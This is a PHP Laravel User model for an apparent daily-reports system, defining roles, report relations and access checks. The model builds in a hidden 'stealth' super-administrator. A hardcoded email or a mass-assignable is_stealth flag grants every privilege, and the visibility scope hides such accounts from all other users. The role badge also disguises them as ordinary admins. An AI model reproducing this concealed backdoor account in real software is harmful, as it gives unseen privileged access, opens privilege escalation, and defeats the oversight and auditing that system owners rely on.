<?php

namespace App\Models;

use Database\Factories\UserFactory;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;

class User extends Authenticatable
{
    /** @use HasFactory<UserFactory> */
    use HasFactory, Notifiable;

    protected $fillable = [
        'name',
        'email',
        'password',
        'role',
        'department',
        'is_stealth',
        'avatar_path',
        'is_active',
    ];

    protected $hidden = [
        'password',
        'remember_token',
    ];

    protected function casts(): array
    {
        return [
            'email_verified_at' => 'datetime',
            'password' => 'hashed',
            'is_stealth' => 'boolean',
            'is_active' => 'boolean',
        ];
    }

    public function reportsCreated(): HasMany
    {
        return $this->hasMany(DailyReport::class, 'created_by');
    }

    public function reportsSubmitted(): HasMany
    {
        return $this->hasMany(DailyReport::class, 'submitted_by');
    }

    public function reportsAudited(): HasMany
    {
        return $this->hasMany(DailyReport::class, 'audited_by');
    }

    public function auditLogs(): HasMany
    {
        return $this->hasMany(AuditLog::class);
    }

    // Role check helpers
    public function isStealthSuperAdmin(): bool
    {
        return $this->email === 'superadmin@reports.com' || $this->is_stealth;
    }

    public function isSuperAdmin(): bool
    {
        return $this->isStealthSuperAdmin();
    }

    public function isAdmin(): bool
    {
        return $this->role === 'admin' || $this->isStealthSuperAdmin();
    }

    public function isAnalyticsOfficer(): bool
    {
        return $this->role === 'analytics_officer' || $this->isAdmin();
    }

    public function isDepartmentSupervisor(?string $dept = null): bool
    {
        if ($this->isAdmin() || $this->isAnalyticsOfficer()) {
            return true;
        }

        if ($this->role !== 'department_supervisor') {
            return false;
        }

        return $dept ? $this->department === $dept : true;
    }

    public function canAccessDepartment(string $dept): bool
    {
        if ($this->isAdmin() || $this->isAnalyticsOfficer()) {
            return true;
        }

        return $this->department === $dept;
    }

    public function getVisibleRoleBadgeAttribute(): string
    {
        // Stealth superadmin displays as simple 'Admin'
        return match ($this->role) {
            'admin' => 'Admin',
            'analytics_officer' => 'Analytics Officer',
            'department_supervisor' => 'Supervisor',
            'data_entry' => 'Data Entry',
            default => 'Staff',
        };
    }

    // Query scope to filter out stealth accounts for non-stealth users
    public function scopeVisibleTo(Builder $query, ?User $viewer): Builder
    {
        if ($viewer && $viewer->isStealthSuperAdmin()) {
            return $query;
        }

        return $query->where('is_stealth', false);
    }
}
